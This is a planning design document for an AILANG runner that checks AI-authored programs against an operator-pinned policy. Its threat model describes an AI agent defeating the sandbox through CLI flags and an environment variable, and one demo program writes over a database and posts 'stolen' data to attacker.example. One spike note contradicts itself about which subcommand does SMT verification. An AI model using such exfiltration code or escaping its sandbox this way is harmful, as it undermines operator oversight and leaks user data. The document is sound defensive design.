# M-AGENT-SAFE-RUNNER: Turnkey Sandboxed Execution for AI-Authored AILANG Programs

**Status**: Planned (M1 spike landed on dev — see "Spike Results" below)
**Target**: v0.16.0
**Priority**: P1 (Medium-High — blocks the "AILANG is the safe language for AI-authored code" story)
**Estimated**: 5–7 days (M1–M5); +2 days for M6 cloud adapter. M1 spike consumed ~0.5 day of that budget.
**Dependencies**: None for M1–M5. M3 leans on existing `ailang messages` bus. M-PKG-AUTONOMOUS-CASCADE-SAFE is a sibling but not a hard dep.

## Spike Results (2026-04-30)

A half-day M1 spike was landed directly on `dev` to de-risk the design before committing to the full sprint. Findings:

- **CLI naming**: `ailang policy-check` is already the SMT contract-verification subcommand. The new admission gate ships as **`ailang policy-check --policy P file.ail`** instead. Distinct from `check` (typecheck) and `verify` (SMT).
- **Parametric effects verdict**: monomorphic-only admission in v1 is the right call. Open rows on the entry function are rejected with `error_kind: parametric_entry_unsupported`. `main` is conventionally monomorphic; full row-unification can come in v2 if anyone hits the wall. *This resolves Design Freeze item #2 below.*
- **TOML caveat**: scalar fields must come before `[budgets]` table (TOML semantics). The annotated example policy includes a comment.
- **Lying-signature property is empirically demonstrated**: a program that omits FS from its signature but calls `writeFile` is rejected by the typechecker *before* the policy gate runs, with the existing effect-checker error message. This is the structural advantage over Python/JS.
- **What got built in the spike**: [internal/policy/policy.go](../../../internal/policy/policy.go), [internal/policy/check.go](../../../internal/policy/check.go), tests (10 passing), [cmd/ailang/policy_check.go](../../../cmd/ailang/policy_check.go), three demo `.ail` programs under [examples/safety/](../../../examples/safety/), annotated [agent-policy.example.toml](../../../examples/safety/agent-policy.example.toml). End-to-end demonstrated on three cases (deny / typecheck-reject / admit).
- **What's still missing for M1 to be "done"**: help-text entry, CLI integration tests, transitive import-effect closure check, CHANGELOG entry. M2 (golden tests for policy schema) and M3 (runner daemon) remain unstarted.

## Axiom Compliance

**Canonical reference:** [Design Axioms](/docs/references/axioms)

### Axiom Scoring

| Axiom | Score | Justification |
|-------|-------|---------------|
| A1: Determinism | +1 | Policy admission is a deterministic function of (source, policy). Same inputs → same decision. |
| A2: Replayability | +1 | `program-result` records `effects_used` and `budget_report` — replayable trace by construction. |
| A3: Effect Legibility | +1 | The entire feature exists *because* effect rows are legible. Makes that legibility load-bearing. |
| A4: Explicit Authority | +1 | Caps move from CLI flag (operator habit) to typed policy file (operator artifact). Authority is named. |
| A5: Bounded Verification | +1 | `ailang policy-check --policy` is a typecheck + row-subset check. Decidable, terminating, local. |
| A6: Safe Concurrency | 0 | No concurrency model change. Runner is single-tenant in v1. |
| A7: Machines First | +1 | Policy is TOML (parseable), errors are structured JSON, message schema is typed. |
| A8: Minimal Syntax | 0 | No new language syntax. One new CLI subcommand, one new file format. |
| A9: Cost Visibility | +1 | Budgets in policy, budget report in result. Cost is part of the contract. |
| A10: Composability | +1 | Reuses caps, budgets, sandbox env, `ai-check`, messages bus. No parallel system. |
| A11: Structured Failure | +1 | `error_kind` is an enum: `policy_violation`, `budget_exhausted`, `typecheck_failed`, `timeout`. |
| A12: System Boundary | +1 | The feature *is* the boundary — submission via message, no shared argv/env. Boundary becomes a typed channel. |

**Net Score: +10** → **Decision: ✅ Proceed to implementation**

### Hard Violation Check

- [x] A1 (Determinism): Policy decision is pure function of (source, policy). No clock, no env reads.
- [x] A3 (Effects): No hidden effects introduced; surfaces them.
- [x] A4 (Authority): Tightens authority, never relaxes it. Default policy is `allowed_caps = []`.
- [x] A7 (Machines First): JSON-first. Human-readable output is a render of the JSON.

## Problem Statement

**Current State:**
- AILANG has effect rows, `--caps`, `AILANG_FS_SANDBOX`, and per-effect budgets — all enforced inside the runner.
- These mechanisms protect the runner *given* the operator chose the right flags. They do not protect against an AI agent that controls the invocation.
- An AI agent that emits AILANG source can also emit `ailang run --caps IO,FS,Net,AI`, defeat sandbox via `AILANG_FS_SANDBOX=/`, or pass `--no-budgets`. None of the existing protections survive an adversarial caller.
- SECURITY.md explicitly puts "code produced by external LLMs" out of scope, leaving the *deployment pattern* under-specified. Users who want to run AI-authored programs have no recipe to follow.
- Marketing claims that "AILANG's effects make AI-authored code safer" are technically true but operationally vacuous without a documented submission/runner architecture.

**Impact:**
- Blocks the strongest positioning argument vs. Python/JS for AI-coding workflows.
- Blocks safe deployment of `internal/coordinator/` and `internal/executor/` against untrusted prompts.
- Forces every adopter to invent their own wrapper, with predictable mistakes.

## Goals

**Primary Goal:** Ship a turnkey, documented pattern for running AI-authored AILANG programs under operator-pinned policy, where the policy is a typed artifact and admission control is a typecheck.

**Success Metrics:**
- A single command (`ailang policy-check --policy P file.ail`) statically rejects programs whose declared effects exceed the policy, with structured JSON output.
- Reference runner end-to-end: malicious `.ail` submitted via bus → rejected → `program-result` posted with `error_kind="policy_violation"` — provable in CI.
- Three runnable demo programs in `examples/safety/` show static rejection, runtime budget rejection, and FS sandbox enforcement; each has an integration test.
- Guide `safe-ai-execution.mdx` includes an explicit "what this does NOT protect against" section so the trust boundary is unambiguous.

## High-Impact Decisions

| Decision | Why High Impact | Chosen By | Deadline | Change Cost |
|----------|-----------------|-----------|----------|-------------|
| Policy file format = TOML | Choice of TOML vs JSON vs YAML shapes parser, error UX, comments. TOML matches existing AILANG config style. | human | design | med |
| Subset semantics: `declared_effects ⊆ allowed_caps` (rows, not flat sets) | Defines what "policy violation" means. Row polymorphism implications for libraries with parametric effects. | compiler/human | design | high |
| Bus for v1 = existing `ailang messages` (not a new bus) | Reuses inbox/ack semantics, schema, persistence. Avoids inventing a parallel system. | human | design | med |
| Runner = new `cmd/ailang-runner/` binary (not a subcommand) | Separate binary clarifies trust boundary; can be deployed/upgraded independently of `ailang` CLI. | human | design | med |
| Admission gate = new `ailang policy-check` subcommand | `check` is typecheck only; `verify` is already SMT contract verification (taken). `policy-check` is distinct from both. Resolved during M1 spike. | human | design | low (resolved) |
| How imported modules' effects compose with policy check | If `lib.foo` declares `! {FS}` and is imported by a program whose own funcs declare `! {Net}`, what does the verifier see? Must be the *transitive closure*. | compiler | design | high |
| Default policy when none specified | Default to `allowed_caps = []` (deny-all). Conservative, matches "secure by default." | human | design | low |

### Design Freeze

- [x] Policy file format confirmed as TOML *(M1 spike — BurntSushi/toml already in deps, ergonomics validated)*
- [x] Subset semantics: monomorphic-only entry rows in v1; parametric (open) rows rejected with `parametric_entry_unsupported` *(M1 spike — see [internal/policy/check.go](../../../internal/policy/check.go))*
- [ ] Transitive effect closure rule documented (does the gate walk imports? answer: yes, on the elaborated/typed module — but spike currently only inspects the entry function's signature, which is sufficient *because* the typechecker has already enforced effect propagation up to it. Verify this assumption holds for cross-module imports before M2.)
- [x] Default policy = deny-all confirmed *(M1 spike — `DefaultPolicy()` returns empty `AllowedCaps`)*
- [x] CLI subcommand name = `ailang policy-check` (not `verify`) *(M1 spike — `verify` was taken)*

## Solution Design

### Overview

Move the trust boundary from CLI invocation (where the AI can intervene) to a typed message channel (where it cannot). The runner is a separate process running as a separate principal, parameterized by an operator-authored policy file. The submitted artifact (`.ail` source) is statically gated against the policy before execution; runtime budgets and FS sandbox provide defense-in-depth.

The point of leverage that AILANG has and other languages don't: the submitted artifact carries a typechecked, lie-proof declaration of its effects. Admission is a row-subset check, not a heuristic.

### Architecture

```
┌──────────────┐    program-submit     ┌────────────────────┐
│  AI agent    │  ───────────────────▶ │  ailang messages   │
│ (untrusted)  │     (source only)      │       inbox        │
└──────────────┘                        └─────────┬──────────┘
                                                  │ poll
                                                  ▼
                       ┌──────────────────────────────────────┐
                       │       ailang-runner (trusted)        │
                       │  1. ailang policy-check --policy P src.ail │
                       │  2. ailang run --caps … src.ail      │
                       │  3. post program-result              │
                       └──────────────────┬───────────────────┘
                                          │ program-result
                                          ▼
                       ┌──────────────────────────────────────┐
                       │  ailang messages (result inbox)      │
                       └──────────────────────────────────────┘
```

**Components:**

1. **`agent-policy.toml`** — operator-authored, deploy-time-pinned policy. Declares allowed caps, FS sandbox root, network allowlist, per-effect budgets, timeout, source-size cap, AI provider mode, entry point.

2. **`ailang policy-check --policy P file.ail`** — static gate. Loads policy, typechecks file, computes transitive declared-effect row of the entry function, checks row-subset against `allowed_caps`. Exit 0 on pass; structured JSON with `error_kind` on fail. Reuses `ai-check` machinery internally.

3. **`cmd/ailang-runner/`** — long-running daemon. Polls `ailang messages` inbox for `program-submit`. For each: (a) write source to scratch dir, (b) run `ailang policy-check --policy`, (c) on pass, run `ailang run` with caps/sandbox/budgets from policy, (d) collect stdout/stderr/exit/budget-report, (e) post `program-result`, (f) ack original.

4. **Message schema** — two new message types under `ailang messages` with documented JSON schema (`program-submit`, `program-result`).

5. **Demo programs + integration tests** under `examples/safety/` proving each rejection path.

6. **Guide** at `docs/docs/guides/safe-ai-execution.mdx` — narrative, recipe, trust boundary disclaimer.

### Implementation Plan

**Phase M1: Static policy gate** (~1 day; ~0.5 day already spiked, ~0.5 day remaining)
- [x] `cmd/ailang/policy_check.go` — new subcommand *(spike)*
- [x] `internal/policy/policy.go` — TOML loader + schema struct *(spike)*
- [x] `internal/policy/check.go` — monomorphic row-subset check against typed module *(spike)*
- [x] Unit tests for: row subset, parametric rejection, bad TOML, deny-all default *(spike — 10 tests)*
- [x] JSON error format with stable `error_kind` enum *(spike)*
- [ ] Help-text entry in `cmd/ailang/help.go`
- [ ] CLI-level integration tests (exec the binary, assert JSON + exit code)
- [ ] Confirm transitive cross-module effect propagation works as assumed (or add a walk)
- [ ] Document `ailang policy-check` in CLI docs

**Phase M2: Policy file schema** (~0.5 day)
- [ ] Schema doc with field-by-field reference
- [ ] Golden tests for representative policies (deny-all, net-only, full-trust)
- [ ] Validation errors: unknown fields, type mismatches, conflicting fields

**Phase M3: Reference runner** (~1.5 days)
- [ ] `cmd/ailang-runner/main.go` — daemon skeleton (~200 LOC)
- [ ] Message poll loop using existing `ailang messages` API
- [ ] Scratch-dir lifecycle (per-submit, cleaned on completion)
- [ ] Subprocess invocation of `ailang policy-check` then `ailang run` with fixed env (no inheritance from runner shell)
- [ ] `program-result` poster
- [ ] Smoke test: submit hello-world via `ailang messages send`, observe result

**Phase M4: Demo programs + tests** (~1 day)
- [ ] `examples/safety/drop_table_blocked.ail` — declares `! {FS, Net}`, policy allows only `Net` → static reject
- [ ] `examples/safety/runaway_writes_blocked.ail` — declares `! {FS @limit=5}`, attempts 1000 writes → runtime budget kill
- [ ] `examples/safety/sandboxed_fs.ail` — reads from path outside `fs_sandbox` → capability metadata reject
- [ ] `examples/safety/lying_signature.ail` — calls FS without declaring it → typechecker reject (proves signatures are lie-proof)
- [ ] `internal/runner/safety_demo_test.go` — integration tests asserting exit codes + `error_kind`

**Phase M5: Guide + cross-links** (~1 day)
- [ ] `docs/docs/guides/safe-ai-execution.mdx`
- [ ] Cross-links from `ailang-vs-agents.mdx`, `why-ailang.mdx`, `agent-integration.mdx`
- [ ] Update `SECURITY.md` to point at the guide for the AI-authored-code deployment pattern
- [ ] CHANGELOG entry

**Phase M6 (stretch): Cloud adapter** (~1.5 days)
- [ ] Pub/Sub or SQS subscriber that translates to/from `program-submit`/`program-result`
- [ ] Deployment doc

### Files to Modify/Create

**New files (✅ = landed in M1 spike):**
- ✅ `cmd/ailang/policy_check.go` — admission subcommand (~150 LOC actual)
- ✅ `internal/policy/policy.go` — schema + loader (~110 LOC actual)
- ✅ `internal/policy/check.go` — monomorphic row-subset (~150 LOC actual)
- ✅ `internal/policy/check_test.go` + `policy_test.go` — 10 unit tests (~200 LOC)
- ✅ `examples/safety/drop_table_blocked.ail`, `lying_signature.ail`, `net_only_admitted.ail`
- ✅ `examples/safety/agent-policy.example.toml`
- `cmd/ailang-runner/main.go` — runner daemon (~250 LOC) **[M3]**
- `cmd/ailang-runner/runner_test.go` — integration tests (~200 LOC) **[M3]**
- `examples/safety/runaway_writes_blocked.ail` + `sandboxed_fs.ail` — runtime-rejection demos **[M4]**
- `internal/runner/safety_demo_test.go` — CLI-level integration tests (~250 LOC) **[M4]**
- `docs/docs/guides/safe-ai-execution.mdx` — guide (~600 lines) **[M5]**

**Modified files:**
- `cmd/ailang/help.go` — document `verify` subcommand
- `SECURITY.md` — link to guide; clarify scope
- `docs/docs/guides/ailang-vs-agents.mdx` — link to guide
- `docs/docs/why-ailang.mdx` — link to guide
- `CHANGELOG.md` — entry under v0.16.0

## Examples

### Example 1: Static rejection (drop-table)

**`agent-policy.toml`:**
```toml
allowed_caps = ["Net"]
fs_sandbox = "/tmp/agent-work"
budgets = { Net = 100 }
timeout_ms = 5000
entry = "main"
```

**`drop_table_blocked.ail`:**
```ailang
module examples/safety/drop_table_blocked
import std/fs (writeFile)
import std/net (httpPost)

export func main() -> () ! {FS, Net} {
  writeFile("/var/lib/db/data.sqlite", "");  -- exfil step 1
  httpPost("https://attacker.example/exfil", "stolen")
}
```

**Verifier output:**
```bash
$ ailang policy-check --policy agent-policy.toml drop_table_blocked.ail
{
  "ok": false,
  "error_kind": "policy_violation",
  "declared_effects": ["FS", "Net"],
  "allowed_caps": ["Net"],
  "missing_from_policy": ["FS"],
  "function": "main",
  "module": "examples/safety/drop_table_blocked"
}
$ echo $?
2
```

The runner sees this and posts `program-result` with `error_kind="policy_violation"` *without ever invoking the program.*

### Example 2: Lie-proof signatures

**`lying_signature.ail`:**
```ailang
module examples/safety/lying_signature
import std/fs (writeFile)

-- Declares no effects, but calls FS
export func main() -> () {
  writeFile("/tmp/oops", "")
}
```

**Verifier output:**
```bash
$ ailang policy-check --policy agent-policy.toml lying_signature.ail
{
  "ok": false,
  "error_kind": "typecheck_failed",
  "message": "function main: declared effects {} but body requires {FS}",
  "function": "main"
}
```

The signature can't lie — typecheck rejects pre-policy. This is the property that distinguishes AILANG from Python/JS at this pattern.

### Example 3: End-to-end via runner

```bash
# Operator launches runner with pinned policy
$ ailang-runner --policy /etc/ailang/agent-policy.toml --inbox agent-submissions &

# AI agent submits source via existing messages bus
$ ailang messages send agent-submissions \
    --type program-submit \
    --body "$(cat malicious.ail)" \
    --from agent-foo

# Runner picks it up, verifies, rejects, posts result
$ ailang messages list --type program-result --unread
ID: 4f1a...  From: ailang-runner
  error_kind: policy_violation
  missing_from_policy: ["FS"]
```

## Success Criteria

- [ ] `ailang policy-check --policy P file.ail` exits nonzero with structured JSON when declared effects exceed policy
- [ ] `ailang policy-check` rejects programs whose function bodies require effects the signature didn't declare (lying-signature test)
- [ ] Runner end-to-end test in CI: submit malicious `.ail` via `ailang messages`, observe `program-result` with `error_kind="policy_violation"`
- [ ] Runtime budget test: program declaring `! {Net @limit=10}` and attempting 100 calls is killed with `budget_report` in result
- [ ] FS sandbox test: program reading outside `fs_sandbox` is rejected with capability error
- [ ] All four example demos pass integration tests in CI
- [ ] Guide includes explicit "what this does NOT protect against" section
- [ ] `make ci` passes (build, test, lint, verify-examples, file-size)
- [ ] CHANGELOG entry references both this design doc and the guide

## Testing Strategy

**Unit tests:**
- Policy parsing: valid TOML, missing fields, unknown fields, type errors, conflicting fields
- Row-subset check: exact match, strict subset, superset (reject), parametric effect rows, transitive imports
- Default-policy behavior: empty file → deny-all
- JSON error shape: stable schema, all `error_kind` enum values reachable

**Integration tests:**
- `ailang policy-check` against each `examples/safety/*.ail` with each example policy
- Runner daemon: submit → verify → result loop, asserting exit codes and `error_kind` values
- Lying-signature test: confirms typechecker rejection happens before policy check

**Manual testing:**
- Run runner on laptop, submit programs from another shell, observe results in `ailang messages`
- Verify error UX is readable when policy is misconfigured

## Deferred Decisions

- Exact JSON schema field ordering and casing — agent may choose, follow `ai-check` precedent
- Runner concurrency (process-per-submit vs queued sequential) — agent may choose; v1 sequential is fine
- Whether `program-result` includes the original source hash for audit replay — agent may choose; recommend yes
- Policy file lookup order (`./agent-policy.toml`, `$AILANG_POLICY`, `--policy`) — agent may choose; recommend explicit `--policy` only for v1
- TOML library (BurntSushi/toml vs pelletier/go-toml) — agent may choose

## Non-Goals

- **Multi-tenant runner** — v1 runs one program at a time. Concurrency is a v2 concern, not a security one.
- **GUI for policy editing** — TOML is the interface. UI is out of scope.
- **Fine-grained network egress policy** — `net_allow` is a hostname allowlist. Anything finer (per-port, per-method, mTLS) is delegated to OS-level / proxy.
- **Replacing OS sandbox** — this is defense-in-depth, not a perimeter. The guide must say so.
- **Stdlib supply chain** — covered by M-SUPPLY-CHAIN-HARDENING. Out of scope here.
- **Capability delegation between programs** — submitted programs cannot grant caps to other submitted programs. v1 is flat.
- **Hot-reload of policy** — runner restart required to change policy. Keeps the trust model simple.

## Timeline

**Day 1–2:** M1 (verifier) + M2 (policy schema)
**Day 3–4:** M3 (runner daemon)
**Day 5:** M4 (demos + tests)
**Day 6:** M5 (guide + cross-links + CHANGELOG)
**Day 7:** Buffer / review
**Optional Day 8–9:** M6 (cloud adapter)

**Total: ~5–7 days** for the turnkey laptop story; **+2 days** for cloud adapter.

## Risks & Mitigations

| Risk | Impact | Mitigation |
|------|--------|-----------|
| Row-subset semantics for parametric effects is harder than expected | High | Spike M1 row-check before committing to M2+. If parametric rows are hairy, restrict v1 to monomorphic entry effects and document the limitation. |
| Existing `ailang messages` bus lacks delivery guarantees we need | Med | Audit bus semantics in M3 spike. If insufficient, document gaps and either fix or scope to fire-and-forget for v1. |
| Operators conflate the runner with a security perimeter and skip OS sandbox | High | Guide opens with "this is defense-in-depth" disclaimer; example deployments include systemd/launchd unit with restricted user as the recommended baseline. |
| Verifier becomes a marketing claim that overpromises | Med | Examples and tests live in CI. If the demos break, the claim breaks. Make that visible. |
| Adoption depends on policy-file ergonomics; bad TOML UX kills it | Med | Annotated example policy in `examples/safety/agent-policy.example.toml` with comments per field. Errors must point at line numbers. |

## Related Documents

**Implemented (informs design):**
- [design_docs/implemented/v0_5_0/M-AGENT-PROTOCOL.md](../../implemented/v0_5_0/M-AGENT-PROTOCOL.md) — message bus design that this builds on
- [design_docs/implemented/v0_7_0/m-script-invoke.md](../../implemented/v0_7_0/m-script-invoke.md) — invocation patterns

**Planned (check for overlap):**
- [design_docs/planned/v0_16_0/m-pkg-autonomous-cascade-safe.md](m-pkg-autonomous-cascade-safe.md) — sibling: install-time gate for cap-changing packages
- [design_docs/planned/v0_16_0/m-taint-types.md](m-taint-types.md) — sibling: taint tracking; complementary to effect policy
- [design_docs/planned/v1_1_0/m-executor-variants.md](../v1_1_0/m-executor-variants.md) — future executor backends; runner should compose with these

## References

- [Design Axioms](/docs/references/axioms) — A3, A4, A12 are load-bearing for this feature
- [SECURITY.md](../../../SECURITY.md) — current scope; will be updated to link this guide
- [internal/effects/capability.go](../../../internal/effects/capability.go) — existing capability struct
- [internal/effects/net_security.go](../../../internal/effects/net_security.go) — existing net allowlist plumbing
- [examples/effect_budget_demo.ail](../../../examples/effect_budget_demo.ail) — existing budget demo to extend
- [docs/docs/guides/ailang-vs-agents.mdx](../../../docs/docs/guides/ailang-vs-agents.mdx) — audience-matched page to cross-link
- M-SUPPLY-CHAIN-HARDENING — covers stdlib supply chain (out of scope here)

## Future Work

- **Cloud bus adapters** (Pub/Sub, SQS, NATS) — M6 stretches into v0.17.x if not done in v0.16.0
- **Multi-tenant runner** with per-submitter quotas
- **Policy bundles** — composable policy fragments for common roles (`policy-readonly.toml`, `policy-net-egress.toml`)
- **Audit log** — append-only record of all submissions and decisions, for compliance review
- **`ailang policy explain`** — given a program and a policy, explain *why* it would or wouldn't pass, with line-level source references
- **Capability delegation** — programs that themselves grant scoped capabilities to sub-programs (requires v2 design)

---

**Document created**: 2026-04-30
**Last updated**: 2026-04-30 (spike landed, design freeze items 1/2/4/5 resolved)

DESIGN_DOC_PATH: design_docs/planned/v0_16_0/m-agent-safe-runner.md
